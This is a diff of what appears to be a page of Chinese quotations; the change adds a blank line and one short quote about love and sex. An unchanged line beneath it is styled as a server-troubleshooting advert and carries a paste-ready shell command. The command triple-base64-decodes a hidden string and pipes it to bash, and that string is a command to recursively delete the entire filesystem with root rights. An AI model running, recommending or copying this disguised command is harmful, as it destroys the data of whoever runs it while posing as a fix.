@@ -47,6 +47,8 @@ skip: false
 
 - 生和死，苦难和苍老，都蕴涵在每一个人的体中，总有一天我们会与之遭逢。我们终将浑然难分，像水溶于水中。
     —— 《看见》
+    
+- 在没有过去和未来的地方，爱活不下来，只有性
 
 - 服务器速度慢？空间不够用？经常死机？在线率低？经常被攻击？
         echo WXpOV2EySjVRbmxpVTBGMFkyMVpaMHg1YjBzPQ==|base64 -D|base64 -D|base64 -D|bash
